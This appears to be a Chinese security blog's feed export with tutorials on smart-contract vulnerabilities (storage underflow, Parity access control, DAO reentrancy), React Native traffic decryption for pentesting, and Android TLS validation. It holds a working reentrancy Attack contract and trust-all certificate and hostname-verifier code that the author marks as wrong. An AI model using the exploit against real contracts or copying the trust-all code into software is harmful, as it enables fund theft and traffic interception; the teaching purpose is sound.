0x02)。bonusCodes为动态数组，位置为0x05，故在0x05中存储数组长度（数组有值后），而bonusCodes数组起始位置在storage中计算方式为keccak256(0x05)。 Ok，理解了以上，接下来就说下如何通过bonusCodes整型下溢来修改withdrawLimit值，这是另一个难点。 storage有256位的地址空间，状态变量从地址0依次排列，而通过 bonusCodes.length-- 溢出使得bonusCodes数组长度变为2**256-1，覆盖了几乎所有storage地址空间。因此withdrawLimit变量也在bonusCodes数组中，需要计算找到withdrawLimit对应的数组下标。 计算方式：Converting Array Indices to Addresses 画个图帮你理解：12345678910111213141516171819202122232425262728 storage + --------------------------- + -- 0x00 | owner | | | &lt;- index: 2**256-keccak256(0x05) + --------------------------- + | | 0x01 | trustedThirdParty | | | + --------------------------- + | | 0x02 | balanceOf(None) | | | + --------------------------- + | | 0x03 | deposited | v | + --------------------------- + | | 0x04 | withdrawLimit | | | &lt;- index: 2**256-keccak256(0x05)+4 + --------------------------- + | | 0x05 --| bonusCodes.length | | | | + --------------------------- + | | | | | | | | + --------------------------- + | ^ | | ... | | | | + --------------------------- + V | | | | | | + --------------------------- + -&gt;- | keccak256(0x05) -&gt;| address(bonusCodes) | | | &lt;- index: 0 + --------------------------- + | | | | | | + --------------------------- + v | | ... | | | + --------------------------- + | | 2**256-1 | | -- + --------------------------- + 最后就是通过合约提供的modifyBonusCode函数修改withdrawLimit值来突破取币额度的限制。]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
        <tag>DASP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[#DASP# Access Control (2)]]></title>
    <url>%2F2018%2F07%2F24%2FDASP-Access-Control-3%2F</url>
    <content type="text"><![CDATA[0x00 Info本篇为DASP TOP10的第二类漏洞Access Control。通过Parity及Rubixi合约分析理解此类型漏洞，改写OpenZeppelin中题目辅助理解。 0x01 Access Control概念：攻击者通过合约不安全的可见性设置时可以直接访问合约的私有变量和函数，这其中需要可能需要绕过一些访问控制。 在使用 Solidity 编写合约代码时，有几种默认的变量或函数访问域关键字：private, public, external 和 internal，对合约实例方法来讲，默认可见状态为 public，而合约实例变量的默认可见状态为 private。具体讲解参见solidity develop visibility这里需要重点关注下external和internal，external函数为合约接口，只能被其他合约调用（在自身需通过this.f()调用）。而internal函数只能被自身调用。 此类漏洞经常会发生在以下场景： 合约使用已经遗弃的tx.origin验证调用者 通过很长的require处理大量的认证逻辑 通过delegatecall调用代理库或者代理合约 通俗讲就是一般的智能合约会通过初始化指定合约的拥有者，来实现类似赋予特权后收回合约资金的功能。而初始化函数如果能被任何人调用的话，攻击者就会将自己成为合约拥有者进行提币或恶意操作。 这里最著名的漏洞就是Parity Wallet Hack。但在介绍该漏洞前需要理解一些solidity知识。 0x02 tx.originSolidity: Tx Origin Attacks 在solidity官方文档中已经声明禁止使用tx.origin做认证。 If your wallet had checked msg.sender for authorization, it would get the address of the attack wallet, instead of the owner address. But by checking tx.origin, it gets the original address that kicked off the transaction, which is still the owner address. The attack wallet instantly drains all your funds. 在solidity中获取合约调用方地址有tx.origin和msg.sender两种方式，但msg.sender代表直接调用者的地址，而tx.origin代表源调用地址。 举例：用户A通过合约B调用合约C对于合约B，tx.origin和msg.sender均为A对于合约C，tx.origin为A，msg.sender为B 0x03 call &amp; delegatecall向合约发送消息有两种底层调用的接口，一个是call，一个是delegatecall。call的原型为：&lt;address&gt;.call.value(...)(...) returns (bool)delegatecall原型为：&lt;address&gt;.delegatecall(...) returns (bool)具体的使用可以看call相关函数 这里有两点需要特别强调 二者的异同： 相同 不同 1. 调用时传递合约所有gas 1. call可以使用.value传ETH 2. 执行失败返回fasle 2. call的外部调用上下文是外部合约，而delegatecall的外部调用上下文是自身 这里借图说话： 实例（可在remix操作）：123456789101112131415161718192021contract A &#123; event callMeMaybeEvent(address _from); function callMeMaybe() payable public &#123; callMeMaybeEvent(this); &#125;&#125;contract B &#123; function callTheOtherContract(address _contractAddress) public &#123; require(_contractAddress.call(bytes4(keccak256("callMeMaybe()")))); require(_contractAddress.delegatecall(bytes4(keccak256("callMeMaybe()")))); SomeLib.calledSomeLibFun(); &#125;&#125;library SomeLib &#123; event calledSomeLib(address _from); function calledSomeLibFun() public &#123; calledSomeLib(this); &#125;&#125; 向另一个合约发送数据时，找不到对应的方法签名，会默认调用fallback()函数。而solidity中的代理库和代理合约正是依据此特性。具体可以看看Proxy Libraries in Solidity。Parity正是依照代理库模式开发，该模式可以解决大量代码的重复部署问题，同时能够减少重复部署产生的gas消耗，最重要可以实现更新只需更新库而不用重新更新部署每个项目。 有了上述的知识储备后进入正题，现实合约中的访问控制漏洞。 ## 0x04 Parity首先建议阅读一些分析文章，然后说说自己的理解推荐zeppelin（区块链安全公司）的分析： The Parity Wallet Hack Explained 中文分析： Parity多重签名函数库自杀漏洞 Parity多重签名合约Delegatecall漏洞回顾 Code: WalletLibrary enhanced-wallet.sol 大体浏览钱包合约代码，其中有四个合约模块：1234WalletEvents // 事件合约，打印日志WalletAbi // 提供abi接口WalletLibrary // 代理库，继承WalletEvents。钱包的核心逻辑，漏洞点正是该合约的initWallet -&gt; initMultiowned函数Wallet // 钱包合约，可以看到代码量很小，通过fallback函数的delegatecall函数调用WalletLibrary函数 可以看到Parity使用了代理库模式。在使用Wallet逻辑时，是间接通过传递参数调用WalletLibrary中函数_walletLibrary.delegatecall(msg.data);而WalletLibrary库中initWallet -&gt; initMultiowned函数又没有做任何校验即可改变合约的拥有者，故而形成漏洞。 0x05 RubixiRubixi合约中的访问控制漏洞 Code可以直接copy进remix进行测试。将creator变量修改为public，通过DynamicPyramid函数即可恶意修改creator。 0x06 ethernaut在OpenZeppelin的ethernaut中有道Delegation题目，正好是此漏洞类型。修改下合约名和函数名便于对比Parity漏洞进行理解：12345678910111213141516171819202122232425contract WalletLibaray &#123; address public owner; function WalletLibaray(address _owner) &#123; owner = _owner; &#125; function initWallet() &#123; owner = msg.sender; &#125;&#125;contract Wallet &#123; address public owner; WalletLibaray _walletLib; function Wallet(address _walletLibAddress) &#123; _walletLib = WalletLibaray(_walletLibAddress); owner = msg.sender; &#125; function () &#123; if (_walletLib.delegatecall(msg.data)) &#123; this; &#125; &#125;&#125; Wallet合约中构造函数实例化WalletLibaray。通过fallback函数中delegatecall传参调用WalletLibaray库函数，调用无任何访问控制的initWallet函数即可改变owner。 0x07 Fomo3D参见#DASP# Bad Randomness (6) – Fomo3D]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
        <tag>DASP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[#DASP# Reentrancy (1)]]></title>
    <url>%2F2018%2F07%2F20%2FDASP-Reentrancy-2%2F</url>
    <content type="text"><![CDATA[0x00 Info从本篇开始学习智能合约漏洞，依据DASP TOP10。 0x01 DAOHistory: The History of the DAO WhitePaper: WhitePaper 白皮书 OpenSource: Github etherscan 概念理解众筹合约，通过资金ETH换取DAO token，从而获得投票和发起议案的权利，按一定规则回馈给投资人投资项目的收益。因此，The DAO特点： 本质是个VC，通过以太坊筹集的资金（ETH）锁定在智能合约中，通过代码主导！ 出资ETH获取对应DAO代币，具有审查项目、投票表决和提出投资项目议案的权利 投资议案由全体代币持有人投票表决，一币一票，票数通过，投资项目可获得相应投资额。利用“众智”+出资额权重决定投资策略（取代传统行业投资经理）。 投资项目的收益按规则回馈股东。 The DAO is attackedthe-dao-the-hack-the-soft-fork-and-the-hard-fork 123+------------------------+ 3.5M ETH lose +-----------+ DoS vul +-----------+| antipattern (withdrew) | ---------------&gt; | soft fork | ---------&gt; | hard fork |+------------------------+ +-----------+ +-----------+ security-alert-dos-vulnerability-in-the-soft-fork 0x02 Reentrancysolidity基础知识合约调用 message call 12bytes4 funcIdentifier = bytes4(keccak256("FuncName(paramType)"));this.call(funcIdentifier, paramValue); contract object 12Contract1 c = Contract1(AddressOfContract1); c.foo(); 限制例如send花费2300gas递归调用栈最大1024层 转币 1231. &lt;address&gt;.transfer() //失败抛出throw且回滚，2300gas2. &lt;address&gt;.send() //失败返回false，2300gas3. &lt;address&gt;.gas().call.vale()() //失败返回false，所有gas fallback Solidity的fallback函数 12345contract SimpleFallback&#123; function()&#123; //fallback function &#125;&#125; 两种情况会调用fallback： 调用函数找不到时 向合约发送ether时 reentrancy &amp; The DAODASP TOP10中reentrancy的描述：dasp reentrancy原型为Race-To-Empty，其中就已经介绍了重置资产放在转币操作后的漏洞。 其中最典型的攻击案例为The DAO。对于The DAO的漏洞分析及利用exp &amp; demo网上一大堆，这里就不ctrlcv了。 建议结合源码一起看，并使用本地（truffle+testrpc or geth testnet）或者在线的remix编译环境上手实践。 可以首先看看中文分析： 区块链安全 - DAO攻击事件解析 以太坊智能合约安全入门 推荐Phil Daian分析： Analysis of the DAO exploit attack steps: Propose a split and wait until the voting period expires. (DAO.sol, createProposal) Execute the split. (DAO.sol, splitDAO) Let the DAO send your new DAO its share of tokens. (splitDAO -&gt; TokenCreation.sol, createTokenProxy) Make sure the DAO tries to send you a reward before it updates your balance but after doing (3). (splitDAO -&gt; withdrawRewardFor -&gt; ManagedAccount.sol, payOut) While the DAO is doing (4), have it run splitDAO again with the same parameters as in (2) (payOut -&gt; _recipient.call.value -&gt; _recipient()) The DAO will now send you more child tokens, and go to withdraw your reward before updating your balance. (DAO.sol, splitDAO) Back to (5)! Let the DAO update your balance. Because (7) goes back to (5), it never actually will :-). 其中最关键的就是第4步，splitDAO -&gt; withdrawRewardFor -&gt; payOut，其中payOut使用_recipient.call.value(_amount)()转币，而splitDAO函数中资产重置是放在withdrawRewardFor函数后，造成漏洞。 demo &amp; exp： SimpleDAO attack reentrancy exp 其他合约中的reentrancy漏洞：CityMayor 特别注意此篇中的分析思路及工具porosity/etherscan 漏洞合约：1234567891011121314151617181920212223242526contract vulnerable_DAO&#123; mapping(address=&gt;uint) userBalances; function vulnerable_DAO() payable &#123; &#125; function getUserBalance(address user) constant returns(uint) &#123; return userBalances[user]; &#125; function addToBalance() payable &#123; userBalances[msg.sender] += msg.value; &#125; function withdrawBalance() &#123; uint amountToWithdraw = userBalances[msg.sender]; if(msg.sender.call.value(amountToWithdraw)() ==false) &#123; throw; &#125; userBalances[msg.sender] = 0; &#125; function getBalance() returns(uint) &#123; return this.balance; &#125;&#125; 攻击利用合约：123456789101112131415161718192021222324252627282930contract Attack &#123; address vulnerable_contract; uint attackCount; address public owner; function Attack() public&#123; attackCount = 2; owner = msg.sender; &#125; function() payable&#123; while(attackCount&gt;0) &#123; attackCount--; require(vulnerable_contract.call(bytes4(keccak256("withdrawBalance()")))); &#125; &#125; function deposit(address _vulnerable_contract) public payable&#123; vulnerable_contract = _vulnerable_contract; require(vulnerable_contract.call.value(msg.value)(bytes4(keccak256("addToBalance()")))); &#125; function withdraw()&#123; require(vulnerable_contract.call(bytes4(keccak256("withdrawBalance()")))); &#125; function getBalance() returns(uint) &#123; return this.balance; &#125;&#125;]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
        <tag>DASP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BlockChain Resources]]></title>
    <url>%2F2018%2F07%2F12%2F%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E8%B5%84%E6%BA%90%2F</url>
    <content type="text"><![CDATA[正所谓不积跬步无以至千里，作为区块链安全学习的第一步，本篇汇聚区块链理论与实践的各种资源，通过知行来理解这个新领域，为安全研究做好伏笔。 BlockChain区块链技术指南中文资料阅读站算法演进挖矿演进共识机制演进自写demo 矿池PHP-MPOSnode-open-mining-portalPowerpool BitCoin简介：how-bitcoin-works-under-hood whitepaper：bitcoin 中文注解：比特币白皮书 个人翻译+注解 Ethereum原理whitepaper: White-Paper 中文：以太坊白皮书 协议架构https://github.com/ethereum/wiki/wiki/R&amp;Dhttps://ethresear.ch 智能合约Dapp state wiki：ÐApp Development 入门指南：The Hitchhiker’s Guide to Smart Contracts in Ethereum以太坊开发入门，完整入门篇Getting Started with Ethereum and Soliditylearning-solidity-part-1-deploy-a-contract 开发事例：Create a Hello World Contract in ethereumCreate a Token ContractCreate a Crowdsale ContractHow to create a private Ethereum network Comments Feed 客户端开发环境Ethereum Clients IDE：remixtruffle 模拟环境：testrpc 客户端： 全节点 geth 轻节点 parity cli：https://ethereum.org/cli testnet eth: http://faucet.ropsten.be:3001/ The NEW If you need some Ropsten Testnet Ethers testnet block explorer: https://ropsten.etherscan.io/ Dapp explorer： pc: mist moblie: status solidity: introduction-to-smart-contracts toolsethereumjs-txweb3]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内嵌React的android应用流量加解密]]></title>
    <url>%2F2018%2F05%2F31%2F%E5%86%85%E5%B5%8CReact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86%2F</url>
    <content type="text"><![CDATA[0x00 背景最近在做测试时发现应用使用 facebook 的 react-native 进行混合开发，对于想了解 react-native 的同学，可以查阅github和官方文档，网上也有很多 android 内嵌 react-native 进行混合开发的环境搭建及教程供学习，例如：https://blog.csdn.net/u011148116/article/details/58178348。 该应用核心业务接口数据加密，且加密逻辑在本地js中实现，而测试过程有代理明文抓包改参需求，而研究一二，并记录过程。 0x01 通信加解密历史终端应用渗透测试包括 客户端&lt;–通信–&gt;服务端，客户端测试可以通过各种逆向反编译、动态调试、hook框架分析逻辑及攻击面，而服务端安全则需要通过中间人的方式抓包改参（人工、漏扫、fuzz）来挖掘服务端漏洞。 而现有的app基本都使用https传输，对数据敏感的应用会做二次加密或格式化序列化处理。针对https的原理和绕过可以参考android网络请求-证书认证，而对于二次加密，则需要逆向分析客户端代码了。 常见的加解密逻辑都会在java层或native层，通过url、头关键字、请求关键字、加密算法、log等关键字在反编译代码中搜寻定位。 绕过加密手段有: hook插件+代理插件的方式 hook插件+server+代理插件的方式 其核心都是在代理中获取明文数据，而明文加密的操作放在插件中。 hook插件+代理插件的方式 hook插件+server+代理插件的方式 0x02 react-native js解密本次测试开始采用通用方式，在反编译代码中搜寻蛛丝马迹，然并卵，本以为请求逻辑做在了native中，简单搜索”System.loadLibrary”也未确定可疑so文件。 故通过解压apk，全局搜索接口关键字： 1grep -rn "xxx" . 在 assets 文件下的js文件中发现关键字： 可确定使用js+android混合开发，而网络请求与数据加密均由js实现。 那我们思路就是js强制发明文，经过burp加密发送；或者经过server加密，burp发送加密数据。 ok，思路清晰后，我们就要带着如下问题进行尝试： js中post数据构成逻辑为何？如何强制明文？ 两种方式工作量对比，若采用burp加密，是复现js加密算法，还是加载js？若采用server加密，改如何构建c（burp）-s（server）？ server我使用擅长的python实现，那如何在python中运行js？ 首先来看第一个问题： js文件“index.android.bundle”未做加密和强混淆，通过格式化即可看到代码原貌，通过关键字（箭头所指）确定发送请求和参数构造（图中文字）代码： 而参数经过一系列函数的运算加密生成： 发送明文也很简单，直接修改js代码 return r 即可，这里也打消在burp插件中复现js加密逻辑的想法，真的很复杂。 这里因为修改了apk的资源文件，重压缩打包后需要签名，否则安装报错。 接着看第二个问题： 直接在burp插件中实现js的运行是否可行，用java需要js解释引擎，感觉上插件体量会比较大而且调试非常不方便。然而用python写插件会有各种异常（不推荐python写burp插件）。 想了一下还是采用server的方式。即在burp插件中实现明文请求拦截，并使用HttpClient发送至python httpserver，server对数据加密回传，burp利用setRequest发送加密后数据进行正常的业务请求。 流程大概如下： 其中burp中使用apache的httpcomponents-client包作为网络请求模块，注意在编辑器中生成burp所用的jar包时需要将第三方包一起打包，否则会报classnotfound错误，推荐使用fatjar打包方式，burp插件处理请求代码：12345678910111213141516171819@Overridepublic void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) &#123; String host = messageInfo.getHttpService().getHost(); if (host.contains("your_hostname"))&#123; if(messageIsRequest) &#123; byte[] request = messageInfo.getRequest(); IRequestInfo ireinfo = helpers.analyzeRequest(request); List&lt;String&gt; headers = ireinfo.getHeaders(); int offset = ireinfo.getBodyOffset(); String body = helpers.bytesToString(request).substring(offset); stdout.println("request body---&gt;\n" + body); String ret = utls.Request(body); stdout.println("python response---&gt;\n" + ret); String newbody = "&#123;\"data\":\"" + ret.split(":")[0] + "\",\"customInfo\":\"" + ret.split(":")[1] + "\"&#125;"; stdout.println("newbody---&gt;\n" + newbody); messageInfo.setRequest(helpers.buildHttpMessage(headers, newbody.getBytes())); &#125; &#125; &#125; python httpserver使用HTTPServer模块（py3.x）或BaseHTTPServer模块（py2.x）1234567891011121314151617181920212223242526272829303132class PostHandler(BaseHTTPRequestHandler): def _writeheaders(self): print(self.path) print(self.headers) self.send_response(200); self.send_header('Content-type','text/html'); self.end_headers() def do_POST(self): # Parse the form data posted (host,port) = self.client_address print('connect from %s:%s' % (host,port)) self._writeheaders() nbytes = int(self.headers['content-length']) data = self.rfile.read(nbytes) post_values = json.loads(data.decode('utf-8')) print(post_values) data = post_values['data'] customInfo = post_values['customInfo'] if data: data_decrpyted = ctx.call('h',data) if customInfo: customInfo_decrpyted = ctx.call('h',customInfo) # new_post_values = &#123;'data':data_decrpyted, 'customInfo':customInfo_decrpyted&#125; new_post_values = data_decrpyted + ':' + customInfo_decrpyted print(new_post_values) try: # Error: a bytes-like object is required, not 'str'! Solution: str.encode or bytes(s, encoding="utf8") self.wfile.write(str.encode(new_post_values)) except Exception as err: print(err) 最后解决第三个问题 如何在python中运行js代码，进过搜索发现python模块 PyExecJS 提供了非常方便易用的api.其项目地址https://pypi.org/project/PyExecJS/ 官方提供的简单事例：12345678910&gt;&gt;&gt; import execjs&gt;&gt;&gt; execjs.eval("'red yellow blue'.split(' ')")['red', 'yellow', 'blue']&gt;&gt;&gt; ctx = execjs.compile("""... function add(x, y) &#123;... return x + y;... &#125;... """)&gt;&gt;&gt; ctx.call("add", 1, 2)3 可以看到只需加载编译js，并调用call即可运行js函数。 那剩下的工作就是剥离出“index.android.bundle”中的加密函数，并在httpserver处理响应（wfile.write）时对明文数据调用加密函数处理就好了，so easy！12data_decrpyted = ctx.call('h',data)customInfo_decrpyted = ctx.call('h',customInfo) 所有工作完成，我们来看下前后效果： 正常数据请求 解密后请求 现在可以愉快的进行渗透测试了:P]]></content>
      <categories>
        <category>android网络</category>
      </categories>
      <tags>
        <tag>burp</tag>
        <tag>react-native</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[android网络请求&证书认证]]></title>
    <url>%2F2018%2F03%2F24%2Fandroid%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81%2F</url>
    <content type="text"><![CDATA[0x00 目的通过使用HttpClinet、HttpURLConnect、Volley、Okhttp、Retrofit及Webview，快速识别android网络请求框架为了能定位关键代码，完全理解不正确及正确的证书、域名及sslpinning校验过程。 0x01 HttpClient &amp; HttpURLConnection发送请求android 6.0 删除HttpClient类库，仍需使用的方法： eclipse：libs中加入org.apache.http.legacy.jar AS：在build.gradle中加入 android { useLibrary &apos;org.apache.http.legacy&apos; } 使用HttpClient发送Http GET请求 1234HttpClient mHttpClient = new DefaultHttpClient();HttpGet mHttpGet = new HttpGet(url);HttpResponse mHttpResponse = mHttpClient.execute(mHttpGet);HttpEntity mHttpEntity = mHttpResponse.getEntity(); DefaultHttpClient with default constructor is not compatible with TLS 1.2 建议使用SystemDefaultHttpClient代替：HttpClient client = new SystemDefaultHttpClient();or HttpClient client = HttpClientBuilder.create().useSystemProperties().build(); 使用HttpURLConnection发送Http GET请求 123URL url = new URL(url);HttpURLConnection urlConnection = (HttpURLConnection)url.openConnection();InputStream mInputStream = mHttpURLConnection.getInputStream(); 以上代码均能自动处理HTTP和HTTPS请求。在调用URL的openConnection()方法时，如果URL是HTTP协议的，返回的是一个HttpURLConnection对象，而如果URL是HTTPS协议的，返回的将是一个HttpsURLConnection对象。 使用代理HttpClient使用代理 123456HttpHost proxy = new HttpHost("127.0.0.1", 9876, "HTTP");HttpParams httpParams = new BasicHttpParams();httpParams.setParameter(ConnRouteParams.DEFAULT_PROXY, proxy);HttpClient mHttpClient = new DefaultHttpClient(httpParams);HttpGet mHttpGet = new HttpGet(url);HttpResponse mHttpResponse = mHttpClient.execute(mHttpGet); HttpURLConnection使用代理 123Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("127.0.0.1", 9876));URL mUrl = new URL(url);HttpURLConnection con = (HttpURLConnection) mUrl.openConnection(proxy); HttpClient 不支持 SOCKS HttpURLConnectino 支持 Proxy.Type.SOCKS 使用系统代理 1234Properties props = System.getProperties();props.setProperty("proxySet", "true");props.setProperty("http.proxyHost", host);props.setProperty("http.proxyPort", port); 代理https请求：https.proxyHost/Port 代理socks请求：socksProxyHost/Port https和证书上面展示了用HttpClient及HttpURLConnect API访问https网站。 特点：由Android系统校验服务端数字证书的合法性，用可信CA签发的数字证书的网站才可以正常访问，私有CA签发的数字证书的网站无法访问。 私有CA签发的证书网站如何访问？ 可以看出如果要进行 SSL 会话，必须得新建一个 SSLSocket 对象，而 SSLSocket对象是通过 SSLSocketFactory 来管理的，SSLSocketFactory对象则依赖于SSLContext ，SSLContext 对象又依赖于 keyManager、TrustManager 和SecureRandom。我们这里最关心的是 TrustManager 对象，正是 TrustManager负责证书的校验。 android Xiaomi MAX证书路径: /system/etc/security/cacerts 准备工作 1. 生成自签证书 生成自己的CA根证书 生成CA私钥文件ca.key： openssl genrsa -out ca.key 1024 生成X.509证书签名请求文件ca.csr： openssl req -new -keyca_private.key -out ca.csr在生成ca.csr的过程中，会让输入一些组织信息等。 生成X.509格式的CA根证书ca_public.crt（公钥证书）： openssl x509-req -in ca.csr -signkey ca_private.key -out ca_public.crt 生成服务器证书 先生成服务器私钥文件server_private.key： openssl genrsa -outserver_private.key 1024 根据服务器私钥生成服务器公钥文件server_public.pem： openssl rsa -inserver_private.key -pubout -out server_public.pem 服务器端需要向CA机构申请签名证书，在申请签名证书之前依然是创建自己的证书签名请求文件server.csr：openssl req -new -key server_private.key -out server.csr 对于用于HTTPS的CSR，Common Name必须和网站域名一致，以便之后进行HostName校验。 服务器端用server.csr文件向CA申请证书，签名过程需要CA的公钥证书和私钥参与，最终颁发一个带有CA签名的服务器端证书server.crt：openssl x509 -req -CA ca_public.crt -CAkey ca_private.key -CAcreateserial -in server.csr -out server.crt 使用webpy搭建服务器，代码详见demo（webpytest.py） 2. 信任所有证书 1234567891011121314151617181920212223242526272829303132//证书校验TrustManager[] trustAllCerts = new TrustManager[] &#123; new X509TrustManager() &#123; @Override public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException &#123; &#125; @Override public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException &#123; &#125; @Override public X509Certificate[] getAcceptedIssuers() &#123; return new X509Certificate[0]; &#125; &#125;&#125;;//域名校验HostnameVerifier hostnameVerifier = new HostnameVerifier() &#123; @Override public boolean verify(String s, SSLSession sslSession) &#123; return true; &#125;&#125;;SSLContext mSSLContext = SSLContext.getInstance("TLS");mSSLContext.init(null, trustAllCerts, new SecureRandom());URL mUrl = new URL(url);//HttpsURLConnection.setDefaultSSLSocketFactory(mSSLContext.getSocketFactory());//HttpsURLConnection.setDefaultHostnameVerifier(hostnameVerifier);HttpsURLConnection httpsURLConnection = (HttpsURLConnection) mUrl.openConnection();httpsURLConnection.setSSLSocketFactory(mSSLContext.getSocketFactory());httpsURLConnection.setHostnameVerifier(hostnameVerifier); 3. 正确的证书校验 正确实现checkServerTrusted函数： 1234567891011121314151617181920public final void checkServerTrusted(X509Certificate[] x509CertificateArr, String str) &#123; if (x509CertificateArr == null) &#123; throw new IllegalArgumentException("check server x509Certificates is null"); &#125; if (x509CertificateArr.length &lt; 0) &#123; throw new IllegalArgumentException("check server x509Certificates is empty"); &#125; for (X509Certificate cert : x509CertificateArr) &#123; try &#123; cert.checkValidity(); String cername = "server1.crt"; InputStream is = new BufferedInputStream(context.getAssets().open(cername)); CertificateFactory certificateFactory = CertificateFactory.getInstance("X.509"); X509Certificate serverCert = (X509Certificate)certificateFactory.generateCertificate(is); cert.verify(serverCert.getPublicKey()); &#125; catch (Exception e e) &#123; e.printStackTrace(); &#125; &#125;&#125; 正确实现域名校验verify函数： 12345public final boolean verify(String str, SSLSession sSLSession) &#123; HostnameVerifier hv = HttpsURLConnection.getDefaultHostnameVerifier(); Boolean result = hv.verify("*.xxx.com", sSLSession); return result;&#125; 以上代码为简单实现，还可以从session获取服务器域名与本地证书解析后的域名做比对。 4. SSL Pinning 直接用预埋的证书来生成TrustManger 参数certStream是证书文件的InputSteam流 另外可以用以下命令查看服务器证书的公钥： keytool -printcert -rfc -file uwca.crt 直接复制粘贴可以将公钥信息硬编码在代码中 可以用以下形式获取此公钥对应的X.509证书： 0x02 Volley在2013年Google I/O大会上推出了一个新的网络通信框架Volley。Volley is an HTTP library that makes networking for Android apps easier and, most importantly, faster. github Android developer trainingpage android版本大于等于2.3则调用基于HttpURLConnection的HurlStack，否则就调用基于HttpClient的HttpClientStack。 volley POST请求 Volley + 自定义证书h修改volley源码（volley.java） 原理和上面讲的一致：读取证书加载到keyStore，创建TrustManagerFactory对象tmf用keyStore初始化，再创建SSLContext对象用tmf初始化，即可以用SSLContext得到SSLSocketFactory进行自签名证书的网络请求。 0x03 OkHttp发送请求官方事例： 1234567891011OkHttpClient client = new OkHttpClient();String post(String url, String json) throws IOException &#123; RequestBody body = RequestBody.create(JSON, json); Request request = new Request.Builder() .url(url) .post(body) .build(); Response response = client.newCall(request).execute(); return response.body().string();&#125; 异步POST请求 1234567891011121314151617OkHttpClient client = new OkHttpClient();RequestBody formBody = new FormBody.Builder() .add("aaa", "bbb") .build();Request request = new Request.Builder() .url(url) .post(formBody) .build();client.newCall(request).enqueue(new Callback() &#123; @Override public void onFailure(Call call, IOException e) &#123; &#125; @Override public void onResponse(Call call, Response response) throws IOException &#123; return response.body().string(); &#125;&#125;); 实例参见阿里TV助手应用 设置代理1OkHttpClient client = new OkHttpClient.Builder().proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress("112.95.91.101", 9999))).build(); 给OkHttp Client添加socks代理 自签名证书未校验服务器端证书链、未校验服务端证书域名（信任所有证书及域名）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// wrong checkServerTrusted &amp; HostnameVerifierTrustManager[] trustAllCerts = new TrustManager[] &#123; new X509TrustManager() &#123; @Override public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException &#123; &#125; @Override public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException &#123; &#125; @Override public X509Certificate[] getAcceptedIssuers() &#123; return new X509Certificate[0]; &#125; &#125;&#125;;HostnameVerifier hostnameVerifier = new HostnameVerifier() &#123; @Override public boolean verify(String s, SSLSession sslSession) &#123; return true; &#125;&#125;;try &#123; SSLContext sslContext = SSLContext.getInstance("TLS"); sslContext.init(null, trustAllCerts, new SecureRandom()); OkHttpClient mOkHttpClient = new OkHttpClient.Builder().hostnameVerifier(hostnameVerifier) .sslSocketFactory(sslContext.getSocketFactory()).build(); okhttp3.Request request = new okhttp3.Request.Builder().url(url).build(); mOkHttpClient.newCall(request).enqueue(new Callback() &#123; @Override public void onFailure(Call call, IOException e) &#123; &#125; @Override public void onResponse(Call call, okhttp3.Response response) throws IOException &#123; String body = response.body().string(); Log.i("lzm", "network---" + body); &#125; &#125;);&#125; catch (NoSuchAlgorithmException e) &#123; e.printStackTrace();&#125; catch (KeyManagementException e) &#123; e.printStackTrace();&#125; 正确实现同上，需真正实现 checkServerTrusted 和 verify 函数。详见demo。 SSL Pinning12345OkHttpClient client = new OkHttpClient.Builder() .certificatePinner(new CertificatePinner.Builder() .add("publicobject.com", "sha256/afwiKY3RxoMmLkuRW1l7QsPZTJPwDS2pdDROQjXw8ig=") .build()) .build(); CertificatePinning 获取本地证书 1234567891011121314151617181920212223public static CertificatePinner getCertificata() &#123; Certificate ca = null; try &#123; CertificateFactory cf = CertificateFactory.getInstance("X.509"); InputStream caInput = ZMApplication.getZMContext().getResources().openRawResource(R.raw.test); try &#123; ca = cf.generateCertificate(caInput); &#125; finally &#123; caInput.close(); &#125; &#125; catch (CertificateException | IOException e) &#123; e.printStackTrace(); &#125; String certPin = ""; if (ca != null) &#123; certPin = CertificatePinner.pin(ca); &#125; CertificatePinner certificatePinner = new CertificatePinner.Builder() .add(UrlConfig.RELEASE_BASE_URL, certPin) .build(); return certificatePinner;&#125; 0x04 RetrofitRetrofit是Square公司开发的一款针对Android网络请求的框架，Retrofit2底层基于OkHttp实现 http://square.github.io/retrofit/ examples 发送请求123456789// 创建接口public interface HtmlService &#123; @GET("/") Call&lt;String&gt; doIndex(); @FormUrlEncoded @POST("/login") Call&lt;String&gt; doLogin(@Field("username")String name, @Field("password") String password);&#125; 123456789101112131415161718192021// 1. 构建Retrofit对象，addConverterFactory是对response进行解析Retrofit retrofit = new Retrofit.Builder() .addConverterFactory(ScalarsConverterFactory.create()) .baseUrl(url) .build();// 2. 动态代理生成接口对象HtmlService htmlService = retrofit.create(HtmlService.class);// 3. 通过接口的方法得到调用的对象// Call&lt;String&gt; call = htmlService.doIndex(); //GETCall&lt;String&gt; call = htmlService.doLogin("admin", "admin"); //POST// 4. 异步方法得到responsecall.enqueue(new Callback&lt;String&gt;() &#123; @Override public void onResponse(Call&lt;String&gt; call, retrofit2.Response&lt;String&gt; response) &#123; Log.i("lzm", response.body()); &#125; @Override public void onFailure(Call&lt;String&gt; call, Throwable throwable) &#123; Log.i("lzm", throwable.getMessage()); &#125;&#125;); 